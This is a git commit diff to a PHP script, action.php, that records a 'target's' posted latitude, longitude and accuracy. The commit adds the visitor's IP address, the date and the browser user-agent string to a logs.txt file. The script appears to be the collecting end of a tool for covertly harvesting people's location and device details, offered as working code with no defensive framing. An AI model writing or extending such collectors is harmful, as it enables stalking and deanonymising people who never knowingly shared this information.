9f701afadb021f73c9b3f453a12be4762afa6f40
Sun <73415680+SunPodder@users.noreply.github.com>
2021-08-05 17:04:27 +0600

    Added IP logs and Device info

--- action.php
+++ action.php
@@ -1,16 +1,41 @@
-<?php 
+<?php
+
+  function getIP() {  
+    //whether ip is from the share internet  
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
+      $ip = $_SERVER['HTTP_CLIENT_IP'];  
+    }  
+    //whether ip is from the proxy  
+    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
+      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
+    }  
+    //whether ip is from the remote address
+    else{
+      $ip = $_SERVER['REMOTE_ADDR'];  
+    }  
+    return $ip;  
+  }
   //target latitude
   $lat = $_POST['lat'];
   //target Longitude
   $long = $_POST['long'];
   //location accuracy
   $acc = $_POST['acc'];
+  //ip
+  $ip = getIP();
+  //date
+  $date = date("d/m/Y");
+  //device info
+  $deviceInfo = $_SERVER['HTTP_USER_AGENT'];
   
   //write downs all information in locations.txt file
-  $file = fopen('locations.txt', 'a');
-  fwrite($file, "Latitude: ".$lat);
-  fwrite($file, "\nLongitude: ".$long);
-  fwrite($file, "\nAccuracy: ".$acc."\n\n");
+  $file = fopen('logs.txt', 'a');
+  fwrite($file, "[\n  Latitude: ".$lat);
+  fwrite($file, "\n  Longitude: ".$long);
+  fwrite($file, "\n  Accuracy: ".$acc);
+  fwrite($file, "\n  IP: ".$ip);
+  fwrite($file, "\n  Date: ".$date);
+  fwrite($file, "\n  Device Info: {\n    ".$deviceInfo."\n  }\n]\n\n");
   fclose($file);
 ?>
 
